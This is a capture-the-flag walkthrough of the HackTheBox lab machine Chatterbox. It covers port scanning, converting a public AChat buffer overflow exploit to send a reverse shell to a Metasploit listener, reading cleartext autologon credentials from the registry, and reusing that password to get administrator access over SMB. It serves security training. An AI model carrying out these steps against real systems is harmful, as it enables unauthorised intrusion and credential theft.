---
title: "HackTheBox: Chatterbox"
date: 2024-08-17
categories:
  - blog
tags:
  - hackthebox
  - exploit_mod
  - buffer_overflow
---

![](/assets/img/chatterbox/Chatterbox.png)

Chatterbox is a retired Windows based system that is accessible with a VIP HackTheBox membership. The box is rated as "Medium" difficulty. I would rate closer to the easy side, however, frustration levels when attempting to exploit the box do rate on the medium end. This is mainly due to having one or two attempts at running the exploit before you have to reboot Chatterbox. Once you have located and properly modified the exploit to gain a low-privilege shell it's pretty straightforward enumeration here to escalate privileges on this box.

If you are not sure where to start with Windows Privilege Escalation this is an extremely handy guide to follow:[ https://github.com/pha5matis/Pentesting-Guide/blob/master/privilege_escalation_windows.md]( https://github.com/pha5matis/Pentesting-Guide/blob/master/privilege_escalation_windows.md)

Let's start at the beginning. 

Nmap scan of all ports to start enumerating the system.

```
nmap -vv -Pn -sCV -T4 -p- 10.10.10.74 -oA chatterbox-nmap
```

Nmap results:

```
PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         syn-ack AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp  open  achat        syn-ack AChat chat system
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-14T22:35:27-04:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 6h20m13s, deviation: 2h18m36s, median: 5h00m11s
| smb2-time: 
|   date: 2024-08-15T02:35:23
|_  start_date: 2024-08-15T01:54:33
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38735/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29086/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64306/udp): CLEAN (Failed to receive data)
|   Check 4 (port 24012/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

Nmap has located some interesting ports.  Maybe a web server running on 9255/tcp? Need to research "AChat" to figure out what this service is. We're also presented with an MD5 favicon hash that is unknown to nmap.

While I did not locate any additional information on the favicon hash in this instance (aside from locating many other Chatterbox write-ups), having a favicon hash may provide a way to expand attack surface when utilizing services such as [Shodan](https://www.shodan.io/). 

Tools such as [favscan](https://blog.shodan.io/deep-dive-http-favicon/), [Favicon-Hash-For-Shodan.io](https://github.com/Mr-P-D/Favicon-Hash-For-Shodan.io), and [FavFreak](https://github.com/devanshbatham/FavFreak) can be used to generate the favicon hash to be included in a search query on Shodan: "http.favicon.hash:INSERT_HASH_ID_HERE"

The [OWASP Favicon Database](https://owasp.org/www-community/favicons_database) is another great resource for searching on favicon hashes.

```
9255/tcp  open  http         syn-ack AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
9256/tcp  open  achat        syn-ack AChat chat system
```

Nothing displays when attempting to browse to ports 9255 or 9256 via web browser or when attempting to connect via nc. 

After some quick googlefu we find what "AChat" is. Also, we take note of the software version number listed. This may be the version in use on our target.

![](/assets/img/chatterbox/Walkthrough-googlefu-achat.png)

Let's take a look to see if there are any known exploits using searchsploit.

![](/assets/img/chatterbox/Walkthrough-searchsploit.png)

We find a remote buffer overflow exploit (36025.py) for Achat 0.150 beta7. We do not have an exact version for the Achat software running on our target, but our research earlier indicated that v0.150 appeared to be the most recent version available.

![](/assets/img/chatterbox/Walkthrough-achat-exploit.png)

The exploit author has provided an msfvenom payload that will spawn calc.exe upon launch. While this may be a good payload to demonstrate a proof of concept on a system where we have access to the desktop, we will want to modify the payload to send a reverse shell.

![](/assets/img/chatterbox/Walkthrough-modified-payload-1.png)

Having modified the payload to produce a reverse shell, we'll run the full msfvenom command and are provided with shell code that will be inserted into the python script in place of the existing shellcode. With the shellcode updated, we'll save and close the python file.

Note on setting up a listener: I initially attempted to use netcat as the listener to catch the reverse shell. The shell would be caught and dropped within a few seconds. After a few modifications of the payload type the shell kept dropping, so I decided to move on to using the multi/handler from metasploit.

Launch msfconsole, set up a multi handler with windows/shell/reverse_tcp as the payload, verify options are set properly, and run the handler.

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > options

Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     80               yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.3:80 
```

With the reverse handler listening, we'll run the exploit and see if we get a shell.

```bash
┌──(kali㉿kali)-[~/Documents/htb/chatterbox]
└─$ ./36025.py                                            
---->{P00F}!
```

```
[*] Sending stage (240 bytes) to 10.10.10.74
[*] Command shell session 1 opened (10.10.14.3:80 -> 10.10.10.74:49162) at 2024-08-16 23:07:18 -0400

Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----  

C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>
```

Great! We have a shell as a low-privilege user Alfred. Navigate to Alfred's desktop folder to retrieve the user flag.

Time to start enumerating the system to find our privilege escalation point.

A review of the Winlogon registry key indicates that "AutoAdminLogon" is enabled for Alfred's user. Alfred's credentials are found in cleartext.

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

![](/assets/img/chatterbox/Walkthrough-alfred-creds.png)

Let's do a quick check to see if the administrator account is using the same password. We'll use smbclient to attempt a connection on C$ using administrator credentials.

```
──(kali㉿kali)-[~/Documents/htb/chatterbox]
└─$ smbclient \\\\10.10.10.74\\c$ -U administrator
Password for [WORKGROUP\administrator]:
```

Alfred's password works for the administrator account as well.

Using smbclient, we'll grab a copy of the root.txt file and secure the root flag.

```
smb: \Users\administrator\Desktop\> get root.txt
getting file \Users\administrator\Desktop\root.txt of size 34 as root.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \Users\administrator\Desktop\> 
```

Success! We have compromised the system and escalated our privileges to local administrator which allowed us to retrieve both the user and root flags.

This was a fun and at times frustrating challenge due to stability issues. Chances are high that you will lose your shell and most likely have to reboot the box at least once. 

Automagic enumeration utilizing winpeas.bat did not work for me. Winpeas would run for a bit and never complete. The shell would hang forcing me to kill the connection and restart the box. Manual enumeration was key for privilege escalation.

While there may be many paths you can take to exploit this box, this one was mine and I hope you find this write-up useful.

![](/assets/img/chatterbox/Walkthrough-pwned.png)